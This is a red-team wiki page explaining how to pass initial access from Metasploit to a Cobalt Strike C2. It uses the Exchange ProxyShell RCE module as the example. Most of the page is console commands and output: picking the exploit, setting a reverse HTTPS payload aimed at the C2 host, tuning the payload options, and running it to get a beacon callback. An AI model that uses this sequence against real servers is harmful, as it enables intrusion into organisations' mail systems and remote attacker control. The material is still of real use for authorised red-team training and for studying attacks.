---
author(s):
  - Sebastian Dante Alexander
tags:
  - initial-access
  - exploitation
  - cobalt-strike
  - windows
credits:
  - rsmudge
---
# Cobalt Strike

> [!NOTE]
> This section is subjected to change with different exploits as they get patched as time passes.

This guide is fairly easy to exploit a vulnerable service to establish connection to cobalt strike. This should work with most exploits without needing to reinvent the wheel. We'll be using proxyshell as an example.

```
msf6 > search -u exchange_proxyshell_rce  
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
  
Matching Modules
================

  #  Name                                          Disclosure Date  Rank       Check  Description
  -  ----                                          ---------------  ----       -----  -----------
  0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/exchange_proxyshell_rce
[*] Using exploit/windows/http/exchange_proxyshell_rce
```

Depending on the listener (or shell handler) type. Set the payload to `windows/x64/meterpreter/reverse_https` for an HTTPS beacon network traffic. If you're using HTTP beacon network traffic without TLS (encrypted packets) then set the payload to `windows/x64/meterpreter/reverse_http`. You're not really delivering `meterpreter` session.

```
msf6 exploit(windows/http/exchange_proxyshell_rce) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(windows/http/exchange_proxyshell_rce) > options

Module options (exploit/windows/http/exchange_proxyshell_rce): 

  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  EMAIL                              no        A known email address for this organization
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT             443              yes       The target port (TCP)
  SRVHOST           0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT           8080             yes       The local port to listen on.
  SSL               true             no        Negotiate SSL/TLS for outgoing connections
  SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                            no        The URI to use for this exploit (default is random)
  UseAlternatePath  false            yes       Use the IIS root dir as alternate path
  VHOST                              no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_https):

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
  LHOST                      yes       The local listener hostname
  LPORT     8080             yes       The local listener port
  LURI                       no        The HTTP Path


Exploit target:

  Id  Name
  --  ----
  0   Windows Powershell
```

Set the target's IP address.

```
msf6 exploit(windows/http/exchange_proxyshell_rce) > set rhosts <target_IP>
rhosts => <target_IP>
```

Specify the C2's IP address and port. This will receive from a #metasploit-framework stager. You’re telling it in this case to generate an HTTPS stager to download a payload.

```
msf6 exploit(windows/http/exchange_proxyshell_rce) > set lhost <cobalt_strike_C2_IP>
lhost => <C2_IP>
msf6 exploit(windows/http/exchange_proxyshell_rce) > set lport 443
lport => 443
```

Set `DisablePayloadHandler` and `PrependMigrate` to the boolean values accordingly in this setup.

```
msf6 exploit(windows/http/exchange_proxyshell_rce) > set DisablePayloadHandler true
DisablePayloadHandler => true
msf6 exploit(windows/http/exchange_proxyshell_rce) > set PrependMigrate true
PrependMigrate => true
msf6 exploit(windows/http/exchange_proxyshell_rce) > set AllowNoCleanup true
AllowNoCleanup => true
```

Exploit the target and you should receive a beacon callback on your C2.

```
msf6 exploit(windows/http/exchange_proxyshell_rce) > run
```

---
## References

### HelpSystems

- [HelpSystems: Metasploit to Beacon Initial Foothold](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/init-access_client-side-exploits.htm)

### MITRE

- [MITRE T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)